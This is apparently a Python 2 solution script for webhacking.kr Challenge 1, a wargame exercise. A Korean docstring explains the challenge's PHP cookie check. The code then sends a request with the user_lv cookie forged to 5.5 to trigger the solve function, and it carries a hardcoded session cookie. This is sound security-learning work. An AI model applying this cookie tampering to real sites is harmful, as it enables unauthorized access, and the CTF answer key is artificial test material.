#-*- coding: utf-8 -*-
"""
[Challenge 1] - score 200
http://webhacking.kr/challenge/web/web-01/

1. 처음 접속 시 "index.phps" 부분에 a태그(anchor)링크가 걸려있고 클릭하면 php를 볼 수 있다.
 - 실제로는 php는 서버에서 이루어지는 작업이기 때문에 볼 수 없지만, 편의를 위해 등록한 것
 
2. "<?" 부터  "?>"의 내용은 PHP 코드가 작성되는 부분으로 서버에서 이루어 지는 작업이다.

3. 우리는 화면에 출력되는 부분이 아닌 서버에서 실행되는 PHP부분을 이용하여 solve() 함수가 출력되게 하면 될 것이다.

4. 먼저 윗 부분의 PHP 코드는 다음과 같다.
    1)    <? // PHP 코드 시작
    2)    if(!$_COOKIE[user_lv]) // 브라우저의 쿠키중 user_lv의 데이터가 존재하지 않으면 아래를 실행
    3)    {
    4)    SetCookie("user_lv","1"); // user_lv을 1로 설정
    5)    echo("<meta http-equiv=refresh content=0>"); // 페이지 새로고침
    6)    }
    7)    ?> // PHP 코드 끝
 - 쿠키중 user_lv의 값이 없을 경우 user_lv의 값을 1로 설정하고 새로고침을 한다.

5. 아래 부분의 PHP 코드는 다음과 같다.
<?
$password="????"; // password 변수에 "????" 문자열을 저장한다.
if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;
/*
    eregi() : Case insensitive regular expression match, 대소문자와 상관없이 정규식으로 패턴매칭하는 함수
    [^0-9,.] : 0부터 9까지의 숫자, ",", "."가 아닌지 검사
    Cookie의 user_lv값이 해당 문자로 이루어져 있는지 검사하여 아니면 Cookie의 user_lv값을 1로 설정
    eregi()의 경우 만족할 경우 1을 반환하고, 아니면 0을 반환  : 즉 해당 문자가 아니면 True인 1을 반환
*/
if($_COOKIE[user_lv]>=6) $_COOKIE[user_lv]=1; // Cookie의 user_lv값이 6보다 크거나 같으면 1로 설정
if($_COOKIE[user_lv]>5) @solve(); // 5보다 크면 solve() 실행 : Goal!
echo("<br>level : $_COOKIE[user_lv]");
?>

6. 즉 solve()를 호출하기 위해서는 다음과 같은 조건을 만족해야 한다.
 1) user_lv의 첫 번째 문자가 "0~9", ",", "."이어야 함
 2) user_lv의 값이 6보다 작아야 함
 3) user_lv의 값이 5보다 커야 함
 
7. 조건을 만족하는 수를 user_lv 쿠키에 설정하여 해당 페이지를 호출하면 solve
 - 5 < user_lv < 6인 값을 쿠키에 설정하여 호출
 - Hint : 숫자를 제외한 "." 문자도 사용 가능
"""
import traceback
import urllib2

import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-01/"

CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
CookieManager.addCookie("user_lv=5.5")

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
    
